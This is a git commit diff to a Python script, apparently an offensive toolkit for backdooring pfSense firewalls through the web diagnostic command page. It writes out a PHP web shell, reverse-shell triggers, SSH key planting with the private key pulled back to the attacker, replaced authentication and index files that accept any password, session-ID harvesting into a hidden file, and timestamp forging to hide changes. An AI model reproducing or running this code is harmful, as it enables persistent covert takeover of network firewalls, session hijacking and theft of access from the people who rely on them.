fb8eb34c4b388c0df107cd5df5a6aee72b479948
magna-sec <72981738+magna-sec@users.noreply.github.com>
2022-09-05 21:33:43 +0100

    Add files via upload

--- NoSense.py
+++ NoSense.py
@@ -2,9 +2,12 @@
 
 ## Ideas:
 # Fix dates on certain files (touch -r) - DONE
-# Dump PHPSESSIDs to hidden file
+# Dump PHPSESSIDs to hidden file - DONE
+# Test PHPSESSIDs to find any potential usable cookies
 # Potentially chmod files so unable to change
-# SSH needs keys to connect, maybe create a "SSH bootstrap"
+# SSH needs keys to connect, maybe create a "SSH bootstrap" - DONE
+# Fix login so backdoor password as opposed to all passwords
+
 
 
 import requests
@@ -25,10 +28,14 @@ url = ""
 username = ""
 password = ""
 
+pfsenseIP = "192.168.44.132"
 url = "https://192.168.44.132"
 username = "admin"
 password = "pfsense"
 csrf = ""
+cmdOutput = ""
+ids = ""
+idsList = []
 
 ## Web Shells
 level1 = """echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' > shell.php"""
@@ -48,7 +55,8 @@ session = requests.session()
 session.verify = False
 
 def simpleGET(path, value, cmd):
-    global url, csrf
+    global url, csrf, ids
+
     simple_url = url + path + value
     print(simple_url)
     simple_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
@@ -65,6 +73,7 @@ def simpleGET(path, value, cmd):
     if(cmd == 0): csrf = re.findall(regex, r.text)[0][:-5]
     if(cmd == 1): parseCMDOutput(r.text)
     if(cmd == 3): print("Starting reverse shell")
+    if(cmd == 4): ids = r.text
 
 def simplePOST(path, value, cmd, postdata):
     global url
@@ -87,11 +96,57 @@ def simplePOST(path, value, cmd, postdata):
     if(cmd == 0): csrf = re.findall(regex, r.text)[0][:-5]
     if(cmd == 1): print(r.text)
 
-
+## SSH Functions
 def toggleSSH():
     simpleGET("/", "", 0)
     loginPOST()
     cmdGET("echo 'y' | /etc/rc.initial.toggle_sshd")
+
+def addSSHKey():
+    global output
+
+    simpleGET("/", "", 0)
+    loginPOST()
+    
+    # Create SSH keys
+    cmdGET('HOSTNAME=`hostname` ssh-keygen -t rsa -C "$HOSTNAME" -f "$HOME/.ssh/id_rsa" -P "" && cat ~/.ssh/id_rsa.pub')
+    cmdGET("touch -r ~/.cshrc ~/.ssh")
+
+    # Read private key
+    cmdGET("cat ~/.ssh/id_rsa")
+    with open('id_rsa', 'w') as f:
+        f.write(cmdOutput + "\n")
+    # Permissions for private key
+    os.popen("chmod 600 id_rsa")
+
+    # Create authorized keys so don't need password
+    cmdGET("cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys")
+
+    # Hide creation date
+    cmdGET("touch -r ~/.cshrc ~/.ssh")
+    cmdGET("touch -r ~/.cshrc ~/.ssh/id_rsa")
+    cmdGET("touch -r ~/.cshrc ~/.ssh/id_rsa.pub")
+    cmdGET("touch -r ~/.cshrc ~/.ssh/authorized_keys")
+
+def cmdSSH(user, cmd):
+    global cmdOutput, pfsenseIP
+
+    cmdOutput = os.system("ssh %s@%s -i id_rsa '%s'" % (user,pfsenseIP,cmd))
+
+def testIDs():
+    global url, ids, idsList
+
+    simpleGET("/.ids.php", "", 4)
+    split_ids = ids.split("\n")
+
+    for i in split_ids:
+        i_bytes = i.encode("ascii")
+        
+        i_decoded = base64.b64decode(i_bytes).decode("ascii")
+        idsList.append(i_decoded)
+
+    print(idsList)
+
 
 # Shell Accesses
 def skidyAccess():
@@ -182,8 +237,9 @@ def proWeb():
 def leetWeb():
     global url
 
+    ## auth.inc
     level4 = "echo '"
-    with open('Files/auth.login.inc', 'r') as file:
+    with open('Files/auth.inc', 'r') as file:
         data = file.read()
     data_mod = data.replace("HEYBEAR", ip).encode("ascii")
     file.close()
@@ -192,13 +248,32 @@ def leetWeb():
 
 
     level4cmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > /etc/inc/auth.inc"""
-
     level4tad = "touch -r index.php /etc/inc/auth.inc"
+
+    ## index.php
+    level4index = "echo '"
+    with open('Files/index.php', 'r') as file:
+        data = file.read().encode("ascii")
+    file.close()
+    level4index += base64.b64encode(data).decode("ascii")
+    level4index += "' > temp_cache"
+
+
+    level4indexcmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > index.php"""
+    level4indextad = "touch -r /etc/inc/auth.inc index.php"
+
     simpleGET("/", "", 0)
     loginPOST()
+    # auth.inc
     cmdGET(level4)
     cmdGET(level4cmd)
     cmdGET(level4tad)
+    # index.php
+    cmdGET(level4index)
+    cmdGET(level4indexcmd)
+    cmdGET(level4indextad)
+
+
     try:
         cmdGET("reboot")
     except:
@@ -245,13 +320,12 @@ def proRev():
     print("Use the automatic rev shell popper please")
     print("No credentials needed to access :)")
 
-def leetRev():
-    print("leet")
-
 
 def parseCMDOutput(responseText):
+    global cmdOutput
 
     cmdOutput = re.findall(cmd_regex, responseText)[0][5:-6]
+
     print(cmdOutput)
 
 def cmdPOST(csrf, cmd):
@@ -295,6 +369,7 @@ def cmdPOST(csrf, cmd):
     r = session.post(cmd_url, headers=cmd_headers, data=cmd_data)
 
     parseCMDOutput(r.text)
+
 def cmdGET(cmd):
     global url 
     cmd_url = url + "/diag_command.php"
@@ -349,6 +424,7 @@ def details():
     password = input("Pfsense Password: ")
 
 def menu():
+    global csrf
     choice1 = input("Pick One:\n(1): Upload a WebShell\n(2): Access WebShell\n(3): Upload a ReverseShell\n(4): ReverseShell Popper\n(5): Backend Backdoors\n(9): Execute a cmd\n(10): Full Web Backdoor\n-> ")
     if(choice1 == "1"):
         choice2 = input("Pick Level\n(1): Skidy\n(2): Amatuer\n(3): Pro\n-> ")
@@ -371,7 +447,7 @@ def menu():
         port = input("RPORT PORT:\n-> ")
         schoice = input("Want a NC listener? (1) Yes (2) No\n-> ")
         if(schoice == "1"): os.popen("qterminal -e nc -lvnp 4455")
-        choice2 = input("Pick Level\n(1): Skidy\n(2): Amatuer\n(3): Pro\n-> ")
+        choice2 = input("Pick Level\n(1): Skidy\n(2): Amatuer\n(3): Pro\n(4): Leet\n-> ")
         if(choice2 == "1"):
             path = "/RevShell.php?ip=" + ip + "&port=" + port
             simpleGET(path, "", 3)
@@ -386,8 +462,17 @@ def menu():
             path = "/system_advanced_routes.php"
             pro_data= {"route": add_encoded}
             simplePOST(path, "", 1, pro_data)
+        if(choice2 == "4"):
+            address = (ip + " " + port).encode("ascii")
+            add_encoded = base64.b64encode(address).decode("ascii")
+            path = "/"
+            simpleGET("/", "", 0)
+            leet_data = {"__csrf_magic": csrf, "loggedin": add_encoded}
+            simplePOST(path, "", 1, leet_data)
+
     if(choice1 == "5"):
         choice2 = input("Pick Backdoor\n(1): Cronjob\n(2): SSH Keys\n(3): Add User\n(10): Toggle SSH\n-> ")
+        if(choice2 == "2"): addSSHKey()
         if(choice2 == "10"): toggleSSH()
     if(choice1 == "9"):
         simpleGET("/", "", 0)
@@ -396,14 +481,15 @@ def menu():
         cmdGET(cmd)
     if(choice1 == "10"):
         print("##### Leet Backdoor #####")
-        print("This will create:\n-Login will accept any password with valid username\n-Web shell on root page\n-Reverse shell on root page")
+        print("This will create:\n-Login will accept any password with valid username\n-Web shell on root page\n-Reverse shell on root page\n-PHPSESSIDs put in .ids\n")
         choice2 = input("This will require a restart of the firewall, is that ok? (1)Yes (2)No\n-> ")
         if(choice2 == "1"): leetWeb()
         if(choice2 == "2"): print("Safe one fam")
 
 def main():
+    testIDs()
 #    details()
-    menu()
+#    menu()
 
 if __name__ == "__main__":
     main()
